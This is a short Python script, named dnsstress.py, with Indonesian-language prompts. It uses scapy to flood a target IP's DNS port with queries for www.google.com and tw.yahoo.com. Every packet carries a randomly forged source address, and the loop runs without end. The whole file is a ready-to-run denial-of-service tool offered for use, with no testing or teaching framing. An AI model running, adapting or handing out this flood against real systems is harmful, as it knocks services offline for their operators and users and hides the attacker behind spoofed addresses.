import sys
import random
import time
from scapy.all import *
import logging

# Disable scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def get_target_ip():
    target_ip = input("Masukkan alamat IP target: ")
    return target_ip

if len(sys.argv) != 2:
    print("Format penggunaan: python dnsstress.py <TargetIP>")
    sys.exit(1)

target_ip = sys.argv[1]

total_packets_sent = 0

while True:
    ip = ".".join(str(random.randint(0, 253)) for _ in range(4))
    sp = random.randint(1024, 62535)
    fram1 = random.randint(1, 13)
    fram2 = random.randint(1, 19)
    l1 = random.randint(1, 100)
    l2 = random.randint(1, 76)
    Lp1 = random.randint(1, 2)
    Lp2 = random.randint(1, 2)
    
    dns_query_google = DNSQR(qname="www.google.com")
    dns_query_yahoo = DNSQR(qname="tw.yahoo.com")
    
    packets_sent_per_second = 0
    
    for _ in range(Lp1):
        ip_packet = IP(dst=target_ip, src=ip)
        udp_packet = UDP(sport=sp, dport=53)
        dns_packet = DNS(qd=dns_query_google)
        send(ip_packet/udp_packet/dns_packet, verbose=0)
        packets_sent_per_second += 1
        
    for _ in range(Lp2):
        ip_packet = IP(dst=target_ip, src=ip)
        udp_packet = UDP(sport=sp, dport=53)
        dns_packet = DNS(qd=dns_query_yahoo)
        send(ip_packet/udp_packet/dns_packet, verbose=0)
        packets_sent_per_second += 1
    
    total_packets_sent += packets_sent_per_second
    print(f"Packets sent: {packets_sent_per_second} packets/second, Total Packets sent: {total_packets_sent} packets")
    
    time.sleep(1)
